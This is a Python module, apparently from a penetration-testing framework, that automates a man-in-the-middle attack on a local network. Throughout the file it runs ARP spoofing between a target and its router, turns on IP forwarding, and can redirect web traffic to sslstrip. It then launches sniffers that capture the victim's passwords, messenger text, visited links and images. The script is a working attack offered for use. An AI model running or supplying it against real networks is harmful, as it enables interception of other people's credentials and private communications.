#        Copyright (C) 2015 Noa-Emil Nissinen (4shadoww)
from core import colors
from collections import OrderedDict
import subprocess
import os

conf = {
	"name": "mitm",
	"version": "1.0",
	"shortdesc": "man in the middle attack",
	"author": "4shadoww",
	"github": "4shadoww",
	"email": "4shadoww0@gmail.com",
	"initdate": "26.4.2016",
	"needroot": 1
}

# List of the variables
variables = OrderedDict((
	('interface', 'eth0'),
	('router', '192.168.1.1'),
	('target', '192.168.1.2'),
	('sniffer', 'dsniff'),
	('ssl', 'true'),
))

# Description for variables
vdesc = [
	'network interface name',
	'router ip address',
	'target ip address',
	'sniffer name (select from sniffer list)',
	'SSLStrip, for SSL hijacking(true or false)',
]

# Additional notes to options
option_notes = colors.green+' sniffers\t description'+colors.end+'\n --------\t ------------\n dsniff\t\t sniff all passwords\n msgsnarf\t sniff all text of victim messengers\n urlsnarf\t sniff victim links\n driftnet\t sniff victim images'

help_notes = colors.red+"this module will not work without root permission!\n this module will not work without xterm, dsniff, driftnet!"+colors.end

# Simple changelog
changelog = "Version 1.0:\nrelease"

def run():
	if not os.geteuid() == 0:
		print(colors.red+'[!] this module needs root permissions!\n[!] please login as root!'+colors.end)
	else:
		if variables['sniffer'] =='dsniff':
			selected_sniffer = 'dsniff -i ' + variables['interface']
		elif variables['sniffer'] =='msgsnarf':
			selected_sniffer = 'msgsnarf -i ' + variables['interface']
		elif variables['sniffer'] =='urlsnarf':
			selected_sniffer = 'urlsnarf -i ' + variables['interface']
		elif variables['sniffer'] =='driftnet':
				selected_sniffer = 'driftnet -i ' + variables['interface']
		else:
			print(colors.red+'invalid sniffer!'+colors.end)

		if variables['ssl'] =='true':
			subprocess.Popen('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
			subprocess.Popen('sslstrip -p -k -f', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
		print (colors.yellow + "[*] IP forwarding ... " + colors.end)
		subprocess.Popen("echo 1 > /proc/sys/net/ipv4/ip_forward", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
		print (colors.yellow + "[*] ARP spoofing ... " + colors.end)
		arp_spoofing1 = 'arpspoof -i ' + variables['interface'] + ' -t ' + variables['target'] +' '+ variables['router']
		subprocess.Popen(arp_spoofing1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
		arp_spoofing2 = 'arpspoof -i ' + variables['interface'] + ' -t ' + variables['router'] +' '+ variables['target']
		subprocess.Popen(arp_spoofing2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
		print (colors.blue + "[*] sniffer starting ...")
		print ("[*] ctrl + c to end"+ colors.end)
		os.system(selected_sniffer)